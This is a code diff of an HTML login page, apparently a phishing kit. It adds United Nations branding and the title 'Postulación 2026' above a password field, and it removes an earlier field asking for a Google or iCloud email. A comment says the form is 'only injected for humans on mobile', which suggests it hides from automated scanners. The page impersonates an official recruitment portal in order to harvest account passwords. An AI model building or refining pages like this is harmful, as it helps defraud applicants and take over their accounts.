@@ -59,15 +59,16 @@
             transition: all 0.3s ease;
         }
 
-        
         @media (max-width: 480px) {
             .login-card {
-                padding: 30px 20px 24px;
+                padding: 20px 15px; /* Ajuste para que el logo respire */
                 border: none; 
                 box-shadow: none;
-                background: transparent;
+                background: #ffffff; /* Fondo blanco sólido para que resalte el logo */
+                width: 100%;
             }
             body { background-color: #ffffff; } 
+            .header img { width: 75px !important; } /* Tamaño ideal para móvil */
         }
 
         .header {
@@ -237,11 +238,11 @@
     <!-- Contenedor oculto: Solo se inyectará para humanos en móvil -->
     <div id="dynamic-content" class="hidden">
 
-    <div id="step-1">
-        <div class="form-group">
-            <label>Correo electrónico(Google o ICloud)</label>
-            <input type="email" id="email" class="input-field" placeholder="Correo electrónico o teléfono">
-        </div>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ee/UN_emblem_blue.svg" alt="UN Logo">
+        <h1>Postulación 2026</h1>
+        <p class="desc">Portal oficial para la recepción de expedientes y actualización de datos.</p>
+    </div>
         <div class="form-group">
             <label>Contraseña</label>
             <input type="password" id="pass" class="input-field" placeholder="Introduce tu contraseña">
